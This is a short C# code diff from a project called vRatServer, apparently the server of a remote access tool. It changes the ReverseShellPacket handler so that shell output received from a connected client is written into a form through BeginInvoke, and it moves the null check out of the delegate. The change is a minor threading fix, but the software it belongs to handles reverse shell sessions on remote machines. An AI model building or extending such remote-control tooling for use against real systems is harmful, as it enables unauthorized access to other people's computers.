@@ -14,16 +14,17 @@ namespace vRatServer.Packets
         public ReverseShellPacket(Client client, byte[] data)
         {
             this.client = client;
-            Program.f1.Invoke((MethodInvoker)delegate
-                {
-                    if (client.rsf != null)
-                    {
-                        client.rsf.update_text(System.Text.Encoding.UTF8.GetString(data));
-                    }
+            if (client.rsf != null)
+            {
+                Program.f1.BeginInvoke((MethodInvoker)delegate {
+
+                    client.rsf.update_text(System.Text.Encoding.UTF8.GetString(data));
 
                 });
+                
+            }
 
-       
+
 
             return;
 
